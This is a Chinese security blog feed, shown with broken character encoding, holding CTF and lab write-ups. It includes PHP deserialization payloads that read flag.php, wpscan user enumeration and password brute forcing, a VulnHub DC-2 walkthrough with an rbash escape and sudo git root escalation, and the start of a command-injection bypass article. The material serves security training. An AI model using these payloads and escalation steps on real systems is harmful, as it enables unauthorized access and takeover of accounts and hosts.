ä¸ºæŠŠæ–‡ä»¶å†…å®¹è®¾ç½®ä¸ºç©ºäº†ï¼Œæ‰€ä»¥çœ‹çœ‹è¯»æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°<code>__destruct()</code>é‡Œåˆ¤æ–­<code>$this-&gt;op</code>ç”¨çš„æ˜¯<code>===</code>ï¼Œè€Œ</p><p><code>process()</code>æ–¹æ³•é‡Œçš„æ¯”è¾ƒç”¨çš„æ˜¯<code>==</code>ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;2&quot;</span>==<span class="number">2</span></span><br><span class="line"><span class="string">&quot;2&quot;</span>==<span class="string">&quot;2e0&quot;</span></span><br><span class="line"><span class="string">&quot;2&quot;</span>==<span class="string">&quot; 2e0&quot;</span></span><br></pre></td></tr></table></figure><p>æœ€åå°±è¿›å…¥äº†<code>$this-&gt;read()</code>ï¼Œä½†æ˜¯ç”±äºå„å‚æ•°éƒ½æ˜¯protectedç±»å‹ï¼Œç”Ÿæˆçš„å­—ç¬¦ä¸²æœ‰<code>\x00</code>,æ‰€ä»¥æ— æ³•pass is_validå‡½æ•°ï¼Œphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥ç›´æ¥ç”¨publicç»•è¿‡ï¼Œæˆ–è€…å°†<code>s</code>æ›¿æ¢æˆ<code>S</code>ï¼Œå¹¶æŠŠ<code>\x00</code>æ›¿æ¢æˆ<code>\00</code>ï¼ŒåŸç†å¯ä»¥å‚è§ï¼š</p><p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p><p>æ„é€ expï¼ŒF12å¾—åˆ°flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$a-&gt;op = <span class="number">2</span>;</span><br><span class="line">$a-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$a-&gt;content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$s = serialize($a);</span><br><span class="line">$s = str_replace(chr(<span class="number">0</span>),<span class="string">&#x27;\00&#x27;</span>,$s);</span><br><span class="line">$s = str_replace(<span class="string">&#x27;s:&#x27;</span>,<span class="string">&#x27;S:&#x27;</span>,$s);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:12:&quot;Hello World!&quot;;&#125;</span></span><br><span class="line"><span class="comment">// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:12:&quot;Hello World!&quot;;&#125;</span></span><br><span class="line"><span class="comment">// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:12:&quot;Hello World!&quot;;</span></span><br><span class="line"><span class="comment">// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:13:&quot;Hello World!&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢å››ä¸ªpayloadéƒ½èƒ½è¯»åˆ°flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wpscanå­¦ä¹ ä½¿ç”¨</title>
      <link href="2020/01/11/wpscan%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/"/>
      <url>2020/01/11/wpscan%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†wordpressæ¼æ´æ‰«æå·¥å…·wpscançš„ä½¿ç”¨!</p><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯wpscan"><a href="#ä»€ä¹ˆæ˜¯wpscan" class="headerlink" title="ä»€ä¹ˆæ˜¯wpscan?"></a>ä»€ä¹ˆæ˜¯wpscan?</h2><p>ä»‹ç»<code>wpscan</code>ä¹‹å‰åº”è¯¥å…ˆä»‹ç»ä¸€ä¸‹<code>wordpress</code>!</p><p><code>Wordpress</code>ä½œä¸ºä¸‰å¤§å»ºç«™æ¨¡æ¿ä¹‹ä¸€ï¼Œåœ¨å…¨ä¸–ç•ŒèŒƒå›´å†…æœ‰å¤§é‡çš„ç”¨æˆ·,è¿™ä¹Ÿå¯¼è‡´ç™½å¸½å­éƒ½ä¼šå»è·Ÿè¸ª <code>WordPress</code>çš„å®‰å…¨é—®é¢˜ï¼Œ<code>Wordpress</code>è‡ªè¯ç”Ÿèµ·å‡ºç°äº†å¾ˆå¤šæ¼æ´ï¼ŒåŒæ ·éƒ¨åˆ†æ’ä»¶ã€ä¸»é¢˜ä¹Ÿå­˜åœ¨æ¼æ´ã€‚äºæ˜¯<code>WPScan</code>åº”è¿è€Œç”Ÿï¼Œæ”¶é›† <code>Wordpress</code>çš„å„ç§æ¼æ´ï¼Œå½¢æˆä¸€ä¸ª<code>Wordpress</code>ä¸“ç”¨æ‰«æå™¨ã€‚</p><p>è¯¥æ‰«æå™¨å¯ä»¥å®ç°è·å–ç«™ç‚¹ç”¨æˆ·åï¼Œè·å–å®‰è£…çš„æ‰€æœ‰æ’ä»¶ã€ä¸»é¢˜ï¼Œä»¥åŠå­˜åœ¨æ¼æ´çš„æ’ä»¶ã€ä¸»é¢˜ï¼Œå¹¶æä¾›æ¼æ´ä¿¡æ¯ã€‚åŒæ—¶è¿˜å¯ä»¥å®ç°å¯¹æœªåŠ é˜²æŠ¤çš„<code>Wordpress</code>ç«™ç‚¹æš´åŠ›ç ´è§£ç”¨æˆ·åå¯†ç ã€‚</p><p>kalié‡Œé»˜è®¤é›†æˆè¯¥å·¥å…·</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><h3 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --update<span class="comment">#æ›´æ–°æ¼æ´åº“</span></span><br><span class="line">wpscan -h<span class="comment">#æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><h3 id="ç«™ç‚¹æ‰«æ"><a href="#ç«™ç‚¹æ‰«æ" class="headerlink" title="ç«™ç‚¹æ‰«æ"></a>ç«™ç‚¹æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url [wordpress url]<span class="comment">#å¯¹wordpressç«™ç‚¹æ‰«æ</span></span><br></pre></td></tr></table></figure><h3 id="æšä¸¾ç”¨æˆ·"><a href="#æšä¸¾ç”¨æˆ·" class="headerlink" title="æšä¸¾ç”¨æˆ·"></a>æšä¸¾ç”¨æˆ·</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url [wordpress url] --enumerate u<span class="comment">#æšä¸¾ç”¨æˆ·åˆ—è¡¨ï¼Œ--enumerateå¯ç”¨-uä»£æ›¿</span></span><br><span class="line">wpscan --url [wordpress url] -P [path to wordlist] -U [username to brute force] <span class="comment">#æš´åŠ›ç ´è§£æŒ‡å®šç”¨æˆ·åçš„å¯†ç ï¼Œå¯åŠ -tæŒ‡å®šçº¿ç¨‹,--ruaéšæœºUAå¤´</span></span><br></pre></td></tr></table></figure><h3 id="æšä¸¾ä¸»é¢˜"><a href="#æšä¸¾ä¸»é¢˜" class="headerlink" title="æšä¸¾ä¸»é¢˜"></a>æšä¸¾ä¸»é¢˜</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url [wordpress url] --enumerate t<span class="comment">#æ‰«æä¸»é¢˜</span></span><br><span class="line">wpscan --url [wordpress url] --enumerate vt<span class="comment">#æ‰«æä¸»é¢˜æ¼æ´</span></span><br><span class="line">wpscan --url [wordpress url] --enumerate at<span class="comment">#æ‰«ææ‰€æœ‰ä¸»é¢˜</span></span><br></pre></td></tr></table></figure><h3 id="æšä¸¾æ’ä»¶"><a href="#æšä¸¾æ’ä»¶" class="headerlink" title="æšä¸¾æ’ä»¶"></a>æšä¸¾æ’ä»¶</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url [wordpress url] --enumerate p<span class="comment">#æ‰«ææ’ä»¶</span></span><br><span class="line">wpscan --url [wordpress url] --enumerate vp<span class="comment">#æ‰«ææ’ä»¶æ¼æ´</span></span><br><span class="line">wpscan --url [wordpress url] --enumerate ap<span class="comment">#æ‰«ææ‰€æœ‰æ’ä»¶</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wpscan </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHubä¹‹DC-2é¶æœº</title>
      <link href="2020/01/01/vulnhub-dc-2/"/>
      <url>2020/01/01/vulnhub-dc-2/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ç©DC-2é¶æœºçš„è¿‡ç¨‹!</p><a id="more"></a><p>kaliï¼š192.168.17.146</p><p>é¶æœºï¼š192.168.17.131</p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>è¿™ä¸ªé¶æœºéœ€è¦å°†<code>dc-2</code>çš„åŸŸåæŒ‡å‘å¯¹åº”é¶æœºip</p><p>é¦–å…ˆarp-scan</p><img src="/2020/01/01/vulnhub-dc-2/20200101221407.png" style="zoom:80%;"><p>æ”¹ä¸‹<code>/etc/hosts</code>æ–‡ä»¶</p><img src="/2020/01/01/vulnhub-dc-2/20200101221624.png" style="zoom:80%;"><p>ç›´æ¥è®¿é—®dc-2åŸŸåï¼Œå¾—åˆ°flag1</p><img src="/2020/01/01/vulnhub-dc-2/20200101221736.png" style="zoom: 67%;"><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1æç¤ºç”¨cewlç”Ÿæˆå­—å…¸çˆ†ç ´å°±ä¼šçœ‹åˆ°ä¸‹ä¸€ä¸ªflagï¼Œé¦–å…ˆæšä¸¾ä¸€ä¸‹ç”¨æˆ·ï¼Œæšä¸¾å‡ºä¸‰ä¸ªç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u</span><br></pre></td></tr></table></figure><img src="/2020/01/01/vulnhub-dc-2/æšä¸¾ç”¨æˆ·.png" style="zoom:80%;"><p>ç”¨cewlç”Ÿæˆå­—å…¸ï¼Œcewlæœ‰å¾ˆå¤šç”¨æ³•ï¼Œå‚è§<a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w a.txt</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨wpscançˆ†ç ´ï¼Œåˆ†åˆ«å°†ç”¨æˆ·åå’Œå¯†ç æ”¾åˆ°ä¸¤ä¸ªæ–‡ä»¶é‡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --passwords /root/Desktop/a.txt --usernames /root/Desktop/b.txt -t 100</span><br></pre></td></tr></table></figure><img src="/2020/01/01/vulnhub-dc-2/çˆ†ç ´ç”¨æˆ·å¯†ç .png" style="zoom:80%;"><p>è·‘å‡ºæ¥ä¸¤ä¸ªè´¦å·å¯†ç ï¼Œç™»é™†ä¸€ä¸‹,æ‰¾åˆ°flag2</p><img src="/2020/01/01/vulnhub-dc-2/flag2.png" style="zoom: 67%;"><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>nmapæ‰«æä¸»æœºå‘ç°7744ç«¯å£å¼€æ”¾ç€æœåŠ¡ï¼Œæ¢æµ‹æœåŠ¡æ˜¯sshï¼Œç™»é™†è¯•ä¸€ä¸‹å§</p><img src="/2020/01/01/vulnhub-dc-2/ç«¯å£æ‰«æ.png" style="zoom:80%;"><img src="/2020/01/01/vulnhub-dc-2/æœåŠ¡æ¢æµ‹.png" style="zoom:80%;"><p>ç™»é™†jerryå¥½åƒç™»ä¸ä¸Šï¼Œæ¢æˆtomç™»ä¸Šäº†ï¼Œlsçœ‹åˆ°flag3.txt</p><img src="/2020/01/01/vulnhub-dc-2/sshç™»é™†.png" style="zoom:80%;"><p>å‘ç°catä¸äº†ï¼Œrbashæ˜¯ä¸€ç§å—é™åˆ¶çš„shellï¼Œå—é™åˆ¶çš„shellæ˜¯é™åˆ¶äº†ä¸€ä¸ªshellçš„éƒ¨åˆ†å‘½ä»¤,åƒcdã€lsã€echo,æˆ–è€…æ˜¯é™åˆ¶äº†ä¸€äº›ç¯å¢ƒå˜é‡,è¯¸å¦‚SHELLã€PATHã€USERã€‚æˆ–è€…é™åˆ¶ä¸€äº›è¾“å‡ºç¬¦,åƒ&gt;ã€&gt;&gt;ç­‰</p><p>å› æ­¤ï¼Œæƒ³åŠæ³•åˆ‡æ¢ä¸€ä¸‹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a<span class="comment">#åˆ‡æ¢shell</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/<span class="comment">#æ·»åŠ $PATHï¼Œcatå’Œsuéƒ½åœ¨/binä¸‹</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin<span class="comment">#sudoåœ¨/usr/binä¸‹</span></span><br></pre></td></tr></table></figure><img src="/2020/01/01/vulnhub-dc-2/flag3.png" style="zoom:80%;"><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>ä»flag3å¯ä»¥çœ‹å‡ºæ¥ï¼Œflag4åº”è¯¥åœ¨jerryç”¨æˆ·homeé‡Œ</p><img src="/2020/01/01/vulnhub-dc-2/flag4.png" style="zoom:80%;"><h2 id="thefinalflag"><a href="#thefinalflag" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>flag4æç¤ºæˆ‘ä»¬ç”¨gitï¼Œåˆ‡æ¢ç”¨æˆ·å‘ç°jerryå¯ä»¥ç›´æ¥ä½¿ç”¨git</p><img src="/2020/01/01/vulnhub-dc-2/åˆ‡æ¢ç”¨æˆ·.png" style="zoom:80%;"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p --<span class="built_in">help</span><span class="comment">#æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯</span></span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><img src="/2020/01/01/vulnhub-dc-2/thefinalflag.png" style="zoom: 80%;">]]></content>
      
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ³¨å…¥åŠå…¶ç»•è¿‡æ–¹å¼</title>
      <link href="2019/12/31/command-exec-bypass/"/>
      <url>2019/12/31/command-exec-bypass/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å‘½ä»¤æ³¨å…¥ä¸­çš„ä¸€äº›ç»•è¿‡æ–¹å¼ï¼</p><a id="more"></a><h2 id="ç‰¹æ®Šç¬¦å·"><a href="#ç‰¹æ®Šç¬¦å·" class="headerlink" title="ç‰¹æ®Šç¬¦å·"></a>ç‰¹æ®Šç¬¦å·</h2><h3 id><a href="#" class="headerlink" title="|"></a>|</h3><p>ç®¡é“ç¬¦ï¼Œè¿ç»“ä¸Šä¸ªæŒ‡ä»¤çš„æ ‡å‡†è¾“å‡ºï¼Œåšä¸ºä¸‹ä¸ªæŒ‡ä»¤çš„æ ‡å‡†è¾“å…¥</p><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>ç”¨æˆ·æœ‰æ—¶å€™æ‰§è¡Œå‘½ä»¤è¦èŠ±å¾ˆé•¿æ—¶é—´ï¼Œå¯èƒ½ä¼šå½±å“åšå…¶ä»–äº‹æƒ…ã€‚æœ€å¥½çš„æ–¹æ³•æ˜¯å°†å®ƒæ”¾åœ¨åå°æ‰§è¡Œã€‚åå°è¿è¡Œçš„ç¨‹åºåœ¨ç”¨æˆ·æ³¨é”€åç³»ç»Ÿè¿˜å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚å½“è¦æŠŠå‘½ä»¤æ”¾åœ¨åå°æ‰§è¡Œæ—¶ï¼Œåœ¨å‘½ä»¤çš„åé¢åŠ ä¸Š<code>&amp;</code></p><h3 id="amp-amp-å’Œ"><a href="#amp-amp-å’Œ" class="headerlink" title="&amp;&amp;å’Œ||"></a>&amp;&amp;å’Œ||</h3><p><code>shell</code>åœ¨æ‰§è¡ŒæŸä¸ªå‘½ä»¤çš„æ—¶å€™ï¼Œä¼šè¿”å›ä¸€ä¸ªè¿”å›å€¼ï¼Œè¯¥è¿”å›å€¼ä¿å­˜åœ¨<code>shell</code>å˜é‡ <code>$?</code> ä¸­ã€‚å½“ <code>$? == 0</code> æ—¶ï¼Œè¡¨ç¤ºæ‰§è¡ŒæˆåŠŸï¼›å½“ <code>$? == 1</code> æ—¶ï¼Œè¡¨ç¤ºæ‰§è¡Œå¤±è´¥ã€‚æœ‰æ—¶å€™ï¼Œä¸‹ä¸€æ¡å‘½ä»¤ä¾èµ–å‰ä¸€æ¡å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚å¦‚ï¼šåœ¨æˆåŠŸåœ°æ‰§è¡Œä¸€æ¡å‘½ä»¤ä¹‹åå†æ‰§è¡Œå¦ä¸€æ¡å‘½ä»¤ï¼Œæˆ–è€…åœ¨ä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åå†æ‰§è¡Œå¦ä¸€æ¡å‘½ä»¤ç­‰ã€‚<code>shell</code>æä¾›äº†<code>&amp;&amp;</code>å’Œ<code>||</code>æ¥å®ç°å‘½ä»¤æ‰§è¡Œæ§åˆ¶çš„åŠŸèƒ½ï¼Œ<code>shell</code>å°†æ ¹æ®<code>&amp;&amp;</code>æˆ–<code>||</code>å‰é¢å‘½ä»¤çš„è¿”å›å€¼æ¥æ§åˆ¶å…¶åé¢å‘½ä»¤çš„æ‰§è¡Œ</p><h4 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 ...]  </span><br></pre></td></tr></table></figure><ul><li>å‘½ä»¤ä¹‹é—´ä½¿ç”¨ &amp;&amp; è¿æ¥ï¼Œå®ç°é€»è¾‘ä¸çš„åŠŸèƒ½ã€‚</li><li>åªæœ‰åœ¨<code>&amp;&amp;</code>å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ <code>$? == 0</code>ï¼‰ï¼Œ<code>&amp;&amp;</code>å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œ</li><li>åªè¦æœ‰ä¸€ä¸ªå‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ <code>$? == 1</code>ï¼‰ï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šè¢«æ‰§è¡Œ</li></ul><h4 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 || command2 [|| command3 ...]  </span><br></pre></td></tr></table></figure><ul><li>å‘½ä»¤ä¹‹é—´ä½¿ç”¨ || è¿æ¥ï¼Œå®ç°é€»è¾‘æˆ–çš„åŠŸèƒ½ã€‚</li><li>åªæœ‰åœ¨ || å·¦è¾¹çš„å‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ <code>$? == 1</code>ï¼‰ï¼Œ<code>||</code>å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œã€‚è¿™å’Œ<code>c</code>è¯­è¨€ä¸­çš„é€»è¾‘æˆ–è¯­æ³•åŠŸèƒ½ç›¸åŒï¼Œå³å®ç°çŸ­è·¯é€»è¾‘æˆ–æ“ä½œã€‚</li><li>åªè¦æœ‰ä¸€ä¸ªå‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ <code>$? == 0</code>ï¼‰ï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šè¢«æ‰§è¡Œã€‚</li></ul><h3 id="åå¼•å·"><a href="#åå¼•å·" class="headerlink" title="`åå¼•å·"></a>`åå¼•å·</h3><p>å‘½ä»¤æ›¿ä»£ï¼Œå¤§éƒ¨åˆ†<code>Unix shell</code>ä»¥åŠç¼–ç¨‹è¯­è¨€å¦‚<code>Perl</code>ã€<code>PHP</code>ä»¥åŠ<code>Ruby</code>ç­‰éƒ½ä»¥æˆå¯¹çš„é‡éŸ³ç¬¦(åå¼•å·)ä½œæŒ‡ä»¤æ›¿ä»£ï¼Œæ„æ€æ˜¯ä»¥æŸä¸€ä¸ªæŒ‡ä»¤çš„è¾“å‡ºç»“æœä½œä¸ºå¦ä¸€ä¸ªæŒ‡ä»¤çš„è¾“å…¥é¡¹</p><h3 id="â€˜å•å¼•å·"><a href="#â€˜å•å¼•å·" class="headerlink" title="â€˜å•å¼•å·"></a>â€˜å•å¼•å·</h3><p>è¢«å•å¼•å·æ‹¬ä½çš„å†…å®¹,å°†è¢«è§†ä¸ºå•ä¸€å­—ç¬¦ä¸²ã€‚åœ¨å¼•å·å†…çš„å˜é‡<code>$</code>ç¬¦å·å°†ä¼šå¤±æ•ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå°†è¢«è§†ä½œä¸€èˆ¬ç¬¦å·å¤„ç†ã€‚</p><h3 id="â€œåŒå¼•å·"><a href="#â€œåŒå¼•å·" class="headerlink" title="â€œåŒå¼•å·"></a>â€œåŒå¼•å·</h3><p>è¢«åŒå¼•å·æ‹¬ä½çš„å†…å®¹ï¼Œå°†è¢«è§†ä¸ºå•ä¸€å­—ç¬¦ä¸²ï¼Œé˜²æ­¢é€šé…ç¬¦çš„æ‰©å±•ï¼Œä½†å…è®¸å˜é‡æ‰©å±• ï¼Œè¿™ç‚¹ä¸å•å¼•å·çš„å¤„ç†æ–¹å¼ä¸åŒ</p><h3 id="æŒ‡ä»¤ç¾¤ç»„"><a href="#æŒ‡ä»¤ç¾¤ç»„" class="headerlink" title="()æŒ‡ä»¤ç¾¤ç»„"></a>()æŒ‡ä»¤ç¾¤ç»„</h3><p>æ ¼å¼ä¸ºï¼š(command1;command2[;command3â€¦])</p><ul><li>ä¸€æ¡å‘½ä»¤éœ€è¦ç‹¬å ä¸€ä¸ªç‰©ç†è¡Œï¼Œå¦‚æœéœ€è¦å°†å¤šæ¡å‘½ä»¤æ”¾åœ¨åŒä¸€è¡Œï¼Œå‘½ä»¤ä¹‹é—´ä½¿ç”¨å‘½ä»¤åˆ†éš”ç¬¦ï¼ˆ;ï¼‰åˆ†éš”ã€‚æ‰§è¡Œçš„æ•ˆæœç­‰åŒäºå¤šä¸ªç‹¬ç«‹çš„å‘½ä»¤å•ç‹¬æ‰§è¡Œçš„æ•ˆæœã€‚</li><li>è¡¨ç¤ºåœ¨å½“å‰ shell ä¸­å°†å¤šä¸ªå‘½ä»¤ä½œä¸ºä¸€ä¸ªæ•´ä½“æ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ () æ‹¬èµ·æ¥çš„å‘½ä»¤åœ¨æ‰§è¡Œå‰é¢éƒ½ä¸ä¼šåˆ‡æ¢å½“å‰å·¥ä½œç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´å‘½ä»¤ç»„åˆéƒ½æ˜¯åœ¨å½“å‰å·¥ä½œç›®å½•ä¸‹è¢«æ‰§è¡Œçš„ï¼Œå°½ç®¡å‘½ä»¤ä¸­æœ‰åˆ‡æ¢ç›®å½•çš„å‘½ä»¤ã€‚</li><li>å‘½ä»¤ç»„åˆå¸¸å’Œå‘½ä»¤æ‰§è¡Œæ§åˆ¶ç»“åˆèµ·æ¥ä½¿ç”¨ã€‚</li></ul><p>ç”¨æ‹¬å·å°†ä¸€ä¸²è¿ç»­æŒ‡ä»¤æ‹¬èµ·æ¥ï¼Œè¿™ç§ç”¨æ³•å¯¹<code>shell</code>æ¥è¯´ï¼Œç§°ä¸ºæŒ‡ä»¤ç¾¤ç»„ã€‚å¦‚ä¸‹é¢çš„ä¾‹å­:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">cd</span> ~ ; vcgh=`<span class="built_in">pwd</span>` ;<span class="built_in">echo</span> <span class="variable">$vcgh</span>)</span><br></pre></td></tr></table></figure><p><img src="/2019/12/31/command-exec-bypass/20191231154412.png"></p><h3 id="å¤§æ‹¬å·"><a href="#å¤§æ‹¬å·" class="headerlink" title="{}å¤§æ‹¬å·"></a>{}å¤§æ‹¬å·</h3><p>å…¶å®å¤§æ‹¬å·æœ‰ä¸€ç§æ‹¼æ¥å­—ç¬¦ä¸²çš„ç”¨æ³•ï¼Œ<code>&#123;xx,yy,zz,...&#125;</code>è¿™ç§å¤§æ‹¬å·çš„ç»„åˆï¼Œå¸¸ç”¨åœ¨å­—ä¸²çš„ç»„åˆä¸Šï¼Œæ¥çœ‹ä¸ªä¾‹å­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 